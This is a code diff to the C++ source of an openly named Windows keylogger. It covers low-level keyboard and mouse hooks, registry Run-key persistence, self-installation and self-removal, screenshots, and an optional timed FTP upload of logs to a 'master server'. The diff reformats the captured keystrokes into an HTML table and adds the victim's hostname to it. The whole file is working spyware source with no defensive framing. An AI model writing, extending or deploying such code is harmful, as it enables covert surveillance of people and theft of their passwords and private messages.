@@ -1,4 +1,5 @@
 #include "keylogger.h"
+#include "tableCSS.h"
 
 using namespace std;
 
@@ -11,7 +12,6 @@ void KeyLogger::persist(std::string path) {
     }
 
     HKEY key;
-
     RegCreateKey(
         HKEY_CURRENT_USER,
         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -23,8 +23,8 @@ void KeyLogger::persist(std::string path) {
     keyValue += path;
 
     keyValue += "\"";
-
-    RegSetValueEx(key, REGKEY_NAME, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
+    
+    RegSetValueEx(key, REGKEY_PERSIST, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
 }
 
 void KeyLogger::purge() {
@@ -36,11 +36,12 @@ void KeyLogger::purge() {
         "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         &key
         );
-    RegDeleteValue(key, REGKEY_NAME);
- 
+    RegDeleteValue(key, REGKEY_PERSIST);
+
     //delete program files and exit
     removeSelf();
 }
+
 
 void KeyLogger::removeSelf() {
     
@@ -97,6 +98,10 @@ KeyLogger::KeyLogger() {
     activeWindowTitle = getActiveWindowTitle();
 
     useFTP = false;
+
+    char hostnameBuff[200];
+    gethostname(hostnameBuff, sizeof(hostnameBuff));
+    hostname = hostnameBuff;
 }
 
 KeyLogger::~KeyLogger() {
@@ -141,44 +146,44 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
                 case SC_LSHIFT:
                     if (!keylogger->isLShiftDown()) {
                         keylogger->setLShiftDown(true);
-                        keylogger->log("<LSHIFT>");
+                        keylogger->log("[LSHIFT]");
                     }
                     break;
                 case SC_RSHIFT:
                     if (!keylogger->isRShiftDown()) {
                         keylogger->setRShiftDown(true);
-                        keylogger->log("<RSHIFT>");
+                        keylogger->log("[RSHIFT]");
                     }
                     break;
                 case SC_ALT:
                     if (!keylogger->isAltDown()) {
                         keylogger->setAltDown(true);
-                        keylogger->log("<ALT>");
+                        keylogger->log("[ALT]");
                     }
                     break;
                 case SC_CTRL:
                     if (!keylogger->isCtrlDown()) {
                         keylogger->setCtrlDown(true);
-                        keylogger->log("<CTRL>");
+                        keylogger->log("[CTRL]");
                     }
                     break;
                 case SC_SPACE:
                     keylogger->log(" ");
                     break;
                 case SC_ENTER:
-                    keylogger->log("<ENTER>\n");
+                    keylogger->log("[ENTER]<br />");
                     break;
                 case SC_TAB:
-                    keylogger->log("<TAB>");
+                    keylogger->log("[TAB]");
                     break;
                 case SC_BACKSPACE:
-                    keylogger->log("<BACKSPACE>");
+                    keylogger->log("[BACKSPACE]");
                     break;
                 case SC_CAPSLOCK:
-                    keylogger->log("<CAPSLOCK>");
+                    keylogger->log("[CAPSLOCK]");
                     break;
                 case SC_ESCAPE:
-                    keylogger->log("<ESCAPE>");
+                    keylogger->log("[ESCAPE]");
                     break;
                 default:
                     DWORD key = 1;
@@ -199,19 +204,19 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
                 case SC_LSHIFT:
                     keylogger->setLShiftDown(false);
-                    keylogger->log("</LSHIFT>");
+                    keylogger->log("[/LSHIFT]");
                     break;
                 case SC_RSHIFT:
                     keylogger->setRShiftDown(false);
-                    keylogger->log("</RSHIFT>");
+                    keylogger->log("[/RSHIFT]");
                     break;
                 case SC_ALT:
                     keylogger->setAltDown(false);
-                    keylogger->log("</ALT>");
+                    keylogger->log("[/ALT]");
                     break;
                 case SC_CTRL:
                     keylogger->setCtrlDown(false);
-                    keylogger->log("</CTRL>");
+                    keylogger->log("[/CTRL]");
                     break;
                 default:
                     break;
@@ -223,7 +228,7 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
             MSLLHOOKSTRUCT hooked = *((MSLLHOOKSTRUCT*)lParam);
             std::stringstream logStr;
-            logStr << "<LMOUSE (" << hooked.pt.x << ", " << hooked.pt.y << ") >\n";
+            logStr << "[LMOUSE (" << hooked.pt.x << ", " << hooked.pt.y << ") ]<br />";
             keylogger->log(logStr.str());
         }
 
@@ -238,7 +243,7 @@ std::string KeyLogger::screenshot() {
     fileName << programDir << DATADIR << "\\" <<  time(NULL) << ".bmp";
     takeScreenshot(GetDesktopWindow(), fileName.str());
 
-    log("<SCREENSHOT " + fileName.str() + ">\n");
+    log("[SCREENSHOT " + fileName.str() + "]<br />");
 
     return fileName.str();
 }
@@ -261,13 +266,20 @@ void KeyLogger::listen() {
 
     khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
     mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
-
+    
+    ifstream logCheck(programDir + DATADIR + "\\" + KEYSTROKES_FILE);
+    bool exists = logCheck.good();
+    logCheck.close();
+    
     logFile.open(programDir + DATADIR + "\\" + KEYSTROKES_FILE, ios::app);
-
+    if (!exists) {
+        logFile << TABLE_CSS;
+        logFile << "<table class=\"table\"><tr><td>Time</td><td>Host</td><td>Window</td><td width=\"50%\">Key strokes</td></tr>";
+    }
 }
 
 void KeyLogger::log(std::string text) {
-
+    
     //user switched windows
     if (getActiveWindowTitle() != activeWindowTitle) {
         writeBuffer();//dump last window's information to file
@@ -278,7 +290,7 @@ void KeyLogger::log(std::string text) {
 
 void KeyLogger::install(std::string target) {
     
-    //already installed, skip
+    //already installed
     if (target == programPath) {
         return;
     }
@@ -293,8 +305,7 @@ void KeyLogger::install(std::string target) {
 
 void KeyLogger::writeBuffer()
 {
-    logFile << getTimeString() << endl << activeWindowTitle << endl << "===============================" << endl << keyboardBuffer << endl << "===============================" << endl << endl;
-    
+    logFile << "<tr><td>" << getTimeString() << "</td><td>" << hostname << "</td><td>" << getActiveWindowTitle() << "</td><td style=\"word-wrap: break-word\">" << keyboardBuffer << "</td></tr>";
     #ifdef USE_FTP
     //upload to master server if it's time
     if (useFTP && time(NULL) - lastUpload > UPLOAD_DELTA) {
@@ -304,7 +315,7 @@ void KeyLogger::writeBuffer()
     #endif
     
     activeWindowTitle = getActiveWindowTitle();
-    keyboardBuffer = "";
+    keyboardBuffer = "";    
 }
 
 std::string KeyLogger::getTimeString() {
